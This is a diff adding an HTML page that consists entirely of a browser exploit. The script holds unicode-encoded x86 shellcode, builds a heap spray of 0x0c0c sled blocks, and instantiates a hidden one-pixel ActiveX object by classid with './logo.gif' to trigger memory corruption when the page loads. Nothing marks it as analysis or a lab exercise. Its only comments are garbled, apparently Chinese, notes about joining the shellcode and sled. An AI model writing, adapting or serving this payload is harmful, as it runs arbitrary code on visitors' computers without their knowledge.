@@ -1,0 +1,25 @@
+<html>  
+<body>  
+<div id="DivID"></div>
+<script>  
+var shellcode="\u68FC\u0A6A\u1E38\u6368\uD189\u684F\u7432\u0C91\uF48B\u7E8D\u33F4\uB7DB\u2B04\u66E3\u33BB\u5332\u7568\u6573\u5472\uD233\u8B64\u305A\u4B8B\u8B0C\u1C49\u098B\u698B\uAD08\u6A3D\u380A\u751E\u9505\u57FF\u95F8\u8B60\u3C45\u4C8B\u7805\uCD03\u598B\u0320\u33DD\u47FF\u348B\u03BB\u99F5\uBE0F\u3A06\u74C4\uC108\u07CA\uD003\uEB46\u3BF1\u2454\u751C\u8BE4\u2459\uDD03\u8B66\u7B3C\u598B\u031C\u03DD\uBB2C\u5F95\u57AB\u3D61\u0A6A\u1E38\uA975\uDB33\u6853\u6577\u7473\u6668\u6961\u8B6C\u53C4\u5050\uFF53\uFC57\uFF53\uF857";                        
+
+var var_C = unescape( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
+while (var_C.length + 20 + 8 < 65536) var_C+=var_C;	
+var_D = var_C.substring(0, (0x0c0c-0x24)/2);
+var_D += shellcode;	// Æ´½Óshellcode
+var_D += var_C;		// Æ´½Ó»¬¿é´úÂë
+var_E = var_D.substring(0, 65536/2);
+while(var_E.length < 0x80000) var_E += var_E;
+var_H = var_E.substring(0, 0x80000 - (0x1020-0x08) / 2); // 7F7F4
+var var_F = new Array();
+for (var_G=0;var_G<0x1f0;var_G++) var_F[var_G]=var_H+"s";
+var myObject=document.createElement('object');
+DivID.appendChild(myObject);
+myObject.width='1';
+myObject.height='1';
+myObject.data='./logo.gif';
+myObject.classid='clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';
+</script>  
+</body>  
+</html>
